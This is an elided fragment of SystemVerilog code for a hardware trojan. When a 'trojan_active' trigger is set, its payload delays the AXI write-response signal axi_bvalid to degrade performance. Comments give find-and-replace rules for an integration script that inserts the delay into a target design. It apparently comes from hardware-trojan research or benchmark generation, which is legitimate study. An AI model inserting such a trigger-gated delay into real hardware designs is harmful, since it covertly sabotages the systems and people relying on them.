 ...
 * Payload: Delay axi_bvalid by N cycles
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_active && axi_bvalid) begin
...
// ============================================================
// Performance Degradation: Delay axi_bvalid by DELAY_CYCLES
//
// Integration Script Must Modify:
//
// IF axi_bvalid is a ready/valid signal:
//   Find: assign axi_bvalid = ready_condition;
//   Replace: assign axi_bvalid = (delay_counter == 0) ? ready_condition : 1'b0;
//
// IF axi_bvalid is in always_ff:
//   Find: axi_bvalid <= ready_value;
//   Replace: axi_bvalid <= (delay_counter == 0) ? ready_value : 1'b0;